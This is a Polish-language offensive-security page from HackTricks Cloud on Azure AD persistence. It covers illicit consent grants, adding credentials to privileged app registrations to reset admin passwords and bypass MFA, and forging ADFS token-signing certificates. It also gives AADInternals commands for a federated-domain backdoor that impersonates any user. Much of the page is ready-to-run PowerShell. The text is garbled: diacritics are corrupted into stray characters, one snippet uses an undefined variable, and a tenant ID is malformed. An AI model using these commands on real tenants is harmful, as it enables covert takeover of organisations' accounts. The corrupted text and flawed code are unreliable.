# Az - Trwao

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

### Nielegalne przyznanie zgody

Domylnie ka偶dy u偶ytkownik mo偶e zarejestrowa aplikacj w Azure AD. Mo偶esz wic zarejestrowa aplikacj (tylko dla docelowego najemcy), kt贸ra wymaga uprawnie o wysokim wpywie z zgod administratora (zatwierdzi j, jeli jeste administratorem) - takie jak wysyanie wiadomoci w imieniu u偶ytkownika, zarzdzanie rolami itp. To pozwoli nam na **wykonanie atak贸w phishingowych**, kt贸re mog by bardzo **owocne** w przypadku powodzenia.

Ponadto, mo偶esz r贸wnie偶 zaakceptowa t aplikacj za pomoc swojego u偶ytkownika jako spos贸b na utrzymanie dostpu do niej.

### Aplikacje i podmioty usug

Z uprawnieniami Administratora aplikacji, GA lub niestandardow rol z uprawnieniami microsoft.directory/applications/credentials/update, mo偶emy doda powiadczenia (sekret lub certyfikat) do istniejcej aplikacji.

Mo偶liwe jest **celowanie w aplikacj o wysokich uprawnieniach** lub **dodanie nowej aplikacji** o wysokich uprawnieniach.

Interesujc rol do dodania do aplikacji byaby rola **Administratora uwierzytelniania uprzywilejowanego**, poniewa偶 umo偶liwia ona **resetowanie hasa** dla Globalnych Administrator贸w.

Ta technika pozwala r贸wnie偶 na **ominicie MFA**.

{% code overflow="wrap" %}
```powershell
$passwd = ConvertTo-SecureString "J~Q~QMt_qe4uDzg53MDD_jrj_Q3P.changed" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("311bf843-cc8b-459c-be24-6ed908458623", $passwd)
Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant e12984235-1035-452e-bd32-ab4d72639a
```
{% endcode %}

* Dla uwierzytelniania opartego na certyfikatach

{% code overflow="wrap" %}
```powershell
Connect-AzAccount -ServicePrincipal -Tenant <TenantId> -CertificateThumbprint <Thumbprint> -ApplicationId <ApplicationId>
```
{% endcode %}

### Federacja - Certyfikat podpisywania token贸w

Posiadajc uprawnienia **DA** w lokalnym AD, mo偶liwe jest utworzenie i importowanie **nowych certyfikat贸w podpisywania token贸w** oraz **certyfikat贸w deszyfrowania token贸w** o bardzo dugiej wa偶noci. Pozwoli nam to **zalogowa si jako dowolny u偶ytkownik**, kt贸rego znamy ImuutableID.

**Uruchom** poni偶sz komend jako **DA na serwerze ADFS**, aby utworzy nowe certyfikaty (domylne haso to 'AADInternals'), doda je do ADFS, wyczy automatyczne odwie偶anie i zrestartowa usug:
```powershell
New-AADIntADFSSelfSignedCertificates
```
Nastpnie zaktualizuj informacje o certyfikacie w Azure AD:
```powershell
Update-AADIntADFSFederationSettings -Domain cyberranges.io
```
### Federacja - Zaufana domena

Posiadajc uprawnienia GA na dzier偶awie, mo偶na **doda now domen** (musi zosta zweryfikowana), skonfigurowa jej typ uwierzytelniania na Federated i skonfigurowa domen, aby **zaufa okrelonemu certyfikatowi** (any.sts w poni偶szej komendzie) oraz wydawcy:
```powershell
# Using AADInternals
ConvertTo-AADIntBackdoor -DomainName cyberranges.io

# Get ImmutableID of the user that we want to impersonate. Using Msol module
Get-MsolUser | select userPrincipalName,ImmutableID

# Access any cloud app as the user
Open-AADIntOffice365Portal -ImmutableID qIMPTm2Q3kimHgg4KQyveA== -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA$true
```
## Odnoniki

* [https://aadinternalsbackdoor.azurewebsites.net/](https://aadinternalsbackdoor.azurewebsites.net/)

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
